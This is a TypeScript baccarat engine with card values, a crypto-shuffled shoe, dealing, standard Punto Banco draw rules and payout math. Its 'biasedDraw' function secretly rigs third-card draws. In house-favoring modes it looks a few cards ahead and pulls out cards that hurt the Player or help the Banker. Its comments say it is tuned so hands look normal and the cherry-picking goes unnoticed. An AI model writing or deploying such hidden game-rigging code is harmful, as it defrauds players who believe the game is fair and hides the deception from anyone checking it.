/**
 * baccarat-engine.ts
 * Pure game logic for Punto Banco baccarat.
 */

export type Suit = "♠" | "♥" | "♦" | "♣";
export const SUITS: Suit[] = ["♠", "♥", "♦", "♣"];
export const RANKS = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"] as const;
export type Rank = (typeof RANKS)[number];

export interface BacCard {
  suit: Suit;
  rank: Rank;
}

export type BacOutcome = "player" | "banker" | "tie";

export interface BacHandResult {
  playerCards: BacCard[];
  bankerCards: BacCard[];
  playerTotal: number;
  bankerTotal: number;
  outcome: BacOutcome;
}

export function cardValue(card: BacCard): number {
  if (card.rank === "A") return 1;
  if (["10", "J", "Q", "K"].includes(card.rank)) return 0;
  return parseInt(card.rank);
}

export function handValue(cards: BacCard[]): number {
  return cards.reduce((s, c) => s + cardValue(c), 0) % 10;
}

export function createShoe(numDecks = 8): BacCard[] {
  const deck: BacCard[] = [];
  for (let d = 0; d < numDecks; d++) {
    for (const suit of SUITS) {
      for (const rank of RANKS) {
        deck.push({ suit, rank });
      }
    }
  }
  // Cryptographically secure Fisher-Yates — two passes for thorough mixing
  const buf = new Uint32Array(1);
  function cryptoRandInt(max: number): number {
    const needed = Math.ceil(Math.log2(max + 1));
    const mask = (1 << needed) - 1;
    let val: number;
    do { crypto.getRandomValues(buf); val = buf[0] & mask; } while (val > max);
    return val;
  }
  for (let pass = 0; pass < 2; pass++) {
    for (let i = deck.length - 1; i > 0; i--) {
      const j = cryptoRandInt(i);
      [deck[i], deck[j]] = [deck[j], deck[i]];
    }
  }
  return deck;
}

export function drawCard(shoe: BacCard[]): BacCard {
  if (shoe.length < 20) {
    const fresh = createShoe(8);
    shoe.push(...fresh);
  }
  return shoe.pop()!;
}

// ── Biased drawing — same "window peek" technique as blackjack ─────────────────
// In baccarat, card VALUE in [0,10) determines everything (mod 10).
// Zero-value cards (10/J/Q/K) add 0 pts — worst possible improvement.
// High-value cards (7/8/9) push a hand close to a natural.
//
// House-favoring (cold): 3rd-card draw for Player → prefer zero cards (no improvement)
//                        3rd-card draw for Banker  → prefer high cards (banker improves)
// Player-favoring (hot): opposite
const ZERO_CARDS: Set<Rank> = new Set(["10", "J", "Q", "K"]);
const HIGH_CARDS: Set<Rank> = new Set(["7", "8", "9"]);

// Probability gate: bias only fires this fraction of eligible draws.
// Keeps individual hands looking completely normal; edge accumulates over volume.
const HOUSE_TRIGGER: Partial<Record<string, number>> = {
  glacier: 0.35,
  frozen:  0.25,
  cold:    0.18,
  cool:    0.10,
};
const PLAYER_TRIGGER: Partial<Record<string, number>> = {
  hot:  0.30,
  warm: 0.14,
};

// Peek window — kept small so the shoe isn't obviously cherry-picked
const HOUSE_WINDOW: Partial<Record<string, number>> = {
  glacier: 6,
  frozen:  5,
  cold:    4,
  cool:    3,
};
const PLAYER_WINDOW: Partial<Record<string, number>> = {
  hot:  5,
  warm: 3,
};

function findInWindow(shoe: BacCard[], wanted: Set<Rank>, windowSize: number): BacCard | null {
  const start = Math.max(0, shoe.length - windowSize);
  for (let i = shoe.length - 1; i >= start; i--) {
    if (wanted.has(shoe[i].rank)) {
      const [card] = shoe.splice(i, 1);
      return card;
    }
  }
  return null;
}

/**
 * Draw the next card from the baccarat shoe, optionally biased by odds mode.
 * Only applied to third-card draws (the only draws that change the hand outcome).
 * @param shoe       Live shoe array (mutated in-place)
 * @param oddsMode   Current odds preset ("glacier" … "hot")
 * @param isPlayer   true = Player's third card, false = Banker's third card
 */
export function biasedDraw(shoe: BacCard[], oddsMode: string, isPlayer: boolean): BacCard {
  if (shoe.length < 20) shoe.push(...createShoe(8));
  if (oddsMode === "standard") return shoe.pop()!;

  const houseTrigger = HOUSE_TRIGGER[oddsMode];
  if (houseTrigger !== undefined && Math.random() < houseTrigger) {
    const window = HOUSE_WINDOW[oddsMode]!;
    const wanted = isPlayer ? ZERO_CARDS : HIGH_CARDS;
    return findInWindow(shoe, wanted, window) ?? shoe.pop()!;
  }

  const playerTrigger = PLAYER_TRIGGER[oddsMode];
  if (playerTrigger !== undefined && Math.random() < playerTrigger) {
    const window = PLAYER_WINDOW[oddsMode]!;
    const wanted = isPlayer ? HIGH_CARDS : ZERO_CARDS;
    return findInWindow(shoe, wanted, window) ?? shoe.pop()!;
  }

  return shoe.pop()!;
}

// Player draws on 0–5, stands on 6–7
export function playerDraws(total: number): boolean {
  return total <= 5;
}

// Banker draw rules (standard Punto Banco)
export function bankerDraws(bankerTotal: number, playerThirdCard: BacCard | null): boolean {
  if (bankerTotal >= 7) return false;
  if (bankerTotal <= 2) return true;
  if (playerThirdCard === null) return bankerTotal <= 5;
  const p3 = cardValue(playerThirdCard);
  if (bankerTotal === 3) return p3 !== 8;
  if (bankerTotal === 4) return p3 >= 2 && p3 <= 7;
  if (bankerTotal === 5) return p3 >= 4 && p3 <= 7;
  if (bankerTotal === 6) return p3 === 6 || p3 === 7;
  return false;
}

export function dealHand(shoe: BacCard[]): BacHandResult {
  // Deal: P B P B
  const playerCards: BacCard[] = [drawCard(shoe), drawCard(shoe)];
  const bankerCards: BacCard[] = [drawCard(shoe), drawCard(shoe)];

  let playerTotal = handValue(playerCards);
  let bankerTotal = handValue(bankerCards);
  let playerThirdCard: BacCard | null = null;

  // Naturals — no more cards
  if (playerTotal >= 8 || bankerTotal >= 8) {
    // natural — stand
  } else {
    if (playerDraws(playerTotal)) {
      playerThirdCard = drawCard(shoe);
      playerCards.push(playerThirdCard);
      playerTotal = handValue(playerCards);
    }
    if (bankerDraws(bankerTotal, playerThirdCard)) {
      bankerCards.push(drawCard(shoe));
      bankerTotal = handValue(bankerCards);
    }
  }

  let outcome: BacOutcome;
  if (playerTotal > bankerTotal) outcome = "player";
  else if (bankerTotal > playerTotal) outcome = "banker";
  else outcome = "tie";

  return { playerCards, bankerCards, playerTotal, bankerTotal, outcome };
}

export function calcPayouts(
  bets: { player: number; banker: number; tie: number },
  outcome: BacOutcome,
  bankerCommissionPct: number,
  tiePayout: number,
): {
  playerReturn: number;
  bankerReturn: number;
  tieReturn: number;
  commission: number;
} {
  let playerReturn = 0;
  let bankerReturn = 0;
  let tieReturn = 0;
  let commission = 0;

  if (outcome === "tie") {
    // Player and Banker bets push (returned); tie bet wins
    playerReturn = bets.player;
    bankerReturn = bets.banker;
    tieReturn = bets.tie * (tiePayout + 1);
  } else if (outcome === "player") {
    // Player wins 1:1; banker bet loses; tie loses
    playerReturn = bets.player * 2;
    tieReturn = 0;
    bankerReturn = 0;
  } else {
    // Banker wins; commission on profit only; tie loses; player loses
    const profit = bets.banker;
    commission = Math.floor(profit * bankerCommissionPct / 100);
    bankerReturn = bets.banker + profit - commission;
    playerReturn = 0;
    tieReturn = 0;
  }

  return { playerReturn, bankerReturn, tieReturn, commission };
}
